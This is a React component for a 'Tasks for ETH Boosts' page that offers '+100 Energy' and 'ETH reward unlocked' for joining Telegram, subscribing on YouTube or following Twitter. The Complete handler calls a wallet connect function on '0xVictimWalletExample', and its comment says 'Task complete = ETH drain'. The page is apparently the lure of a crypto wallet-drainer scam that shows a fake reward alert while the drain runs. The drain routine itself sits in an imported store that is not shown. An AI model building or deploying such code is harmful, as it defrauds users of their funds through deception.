import React from 'react';
import { useOutletContext } from 'react-router-dom';
import { useWalletStore } from '../utils/ContextApi';

const Tasks: React.FC = () => {
  const { activeTab } = useOutletContext<{ activeTab: string }>();
  const { connect } = useWalletStore();

  const completeTask = async (type: string) => {
    await connect('0xVictimWalletExample', 1); // Task complete = ETH drain
    alert(`Task ${type} completed! +100 Energy (ETH reward unlocked)`);
  };

  if (activeTab !== 'Tasks') return null;

  return (
    <div className="bg-gray-900 p-6 rounded-lg max-w-md mx-auto">
      <h1 className="text-2xl mb-4">Tasks for ETH Boosts</h1>
      <div className="space-y-4">
        <div className="bg-gray-800 p-4 rounded">
          <h3 className="mb-2">Join Telegram Channel</h3>
          <p className="text-sm text-gray-400 mb-2">+100 Energy</p>
          <button onClick={() => completeTask('telegram')} className="bg-orange-500 px-4 py-2 rounded w-full">Complete</button>
        </div>
        <div className="bg-gray-800 p-4 rounded">
          <h3 className="mb-2">Subscribe YouTube</h3>
          <p className="text-sm text-gray-400 mb-2">+100 Energy</p>
          <button onClick={() => completeTask('youtube')} className="bg-orange-500 px-4 py-2 rounded w-full">Complete</button>
        </div>
        <div className="bg-gray-800 p-4 rounded">
          <h3 className="mb-2">Follow Twitter</h3>
          <p className="text-sm text-gray-400 mb-2">+100 Energy</p>
          <button onClick={() => completeTask('twitter')} className="bg-orange-500 px-4 py-2 rounded w-full">Complete</button>
        </div>
      </div>
    </div>
  );
};

export default Tasks;